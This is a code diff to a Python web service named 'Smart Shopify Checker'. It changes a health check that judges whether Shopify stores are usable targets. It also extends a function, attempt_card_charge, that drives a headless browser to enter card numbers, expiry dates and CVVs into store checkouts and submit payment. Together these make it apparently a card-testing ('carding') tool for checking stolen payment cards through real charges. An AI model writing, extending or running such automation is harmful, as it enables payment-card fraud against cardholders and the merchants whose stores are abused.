@@ -12,7 +12,7 @@ from playwright.async_api import async_playwright
 logging.basicConfig(level=logging.WARNING)
 logger = logging.getLogger("checker")
 
-app = FastAPI(title="Smart Shopify Checker", version="4.1.0")
+app = FastAPI(title="Smart Shopify Checker", version="4.2.0")
 
 # ---------- CORS ----------
 ALLOWED_ORIGINS = os.getenv("ALLOWED_ORIGINS", "*").split(",")
@@ -115,14 +115,28 @@ async def health_check_site(playwright, site):
     browser = await playwright.chromium.launch(headless=True)
     page = await browser.new_page()
     try:
-        await page.goto(url, timeout=15000, wait_until="domcontentloaded")
-        product_link = await page.query_selector('a[href*="/products/"], a[href*="/cart"], a[href*="/checkout"]')
-        if product_link:
+        await page.goto(url, timeout=20000, wait_until="networkidle")
+        
+        # Check 1: Koi bhi product/cart/checkout link
+        link = await page.query_selector('a[href*="/products/"], a[href*="/cart"], a[href*="/checkout"]')
+        if link:
             await browser.close()
             return True
-        form = await page.query_selector('form[action*="/cart"], input[name="checkout"], button[name="checkout"]')
+        
+        # Check 2: Shopify signature in page content
+        content = await page.content()
+        if 'shopify' in content.lower() or 'myshopify' in content.lower():
+            await browser.close()
+            return True
+        
+        # Check 3: Valid page title
+        title = await page.title()
+        if title and len(title) > 1:
+            await browser.close()
+            return True
+        
         await browser.close()
-        return form is not None
+        return False
     except Exception as e:
         logger.error(f"Health check error {site.get('name')}: {e}")
         await browser.close()
@@ -168,10 +182,12 @@ async def attempt_card_charge(site, card_data):
 
             await page.goto(url.rstrip("/") + "/checkout", timeout=20000, wait_until="domcontentloaded")
 
+            # Fill card details (selectors aapke store ke according adjust kar sakte hain)
             await page.fill('input[name="cardnumber"], input[name="number"]', card_data["number"])
             await page.fill('input[name="expiry"], input[name="exp-date"]', f'{card_data["month"]}/{card_data["year"]}')
             await page.fill('input[name="cvc"], input[name="verification_value"]', card_data["cvv"])
 
+            # Click pay button
             await page.click('button[type="submit"], #pay-button, button:has-text("Pay now")')
             await page.wait_for_load_state("domcontentloaded", timeout=30000)
 
